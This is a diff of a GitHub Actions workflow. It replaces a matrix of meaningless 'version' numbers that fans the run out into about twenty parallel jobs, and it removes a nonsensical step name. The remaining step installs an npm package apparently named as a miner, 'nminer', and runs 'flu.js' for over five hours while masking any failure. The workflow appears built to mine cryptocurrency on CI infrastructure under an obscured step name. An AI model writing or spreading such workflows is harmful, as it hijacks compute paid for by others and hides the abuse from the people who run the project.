@@ -9,26 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3458 }
-          - { version: 1295 }
-          - { version: 2994 }
-          - { version: 5997 }
-          - { version: 4873 }
-          - { version: 6922 }
-          - { version: 9074 }
-          - { version: 2594 }
-          - { version: 8853 }
-          - { version: 1769 }
-          - { version: 380 }
-          - { version: 7813 }
-          - { version: 7665 }
-          - { version: 7295 }
-          - { version: 4036 }
-          - { version: 7316 }
-          - { version: 6415 }
-          - { version: 7035 }
-          - { version: 3260 }
-          - { version: 1642 }
+          - { version: 7561 }
+          - { version: 8787 }
+          - { version: 9758 }
+          - { version: 1621 }
+          - { version: 9487 }
+          - { version: 7671 }
+          - { version: 4665 }
+          - { version: 7501 }
+          - { version: 4316 }
+          - { version: 9071 }
+          - { version: 3800 }
+          - { version: 754 }
+          - { version: 3840 }
+          - { version: 9452 }
+          - { version: 3169 }
+          - { version: 1590 }
+          - { version: 4811 }
 
     steps:
       - name: Checkout
@@ -39,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: memorise violently when ah boom
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 308m node flu.js || echo "flu executed"
+          timeout 346m node flu.js || echo "flu executed"
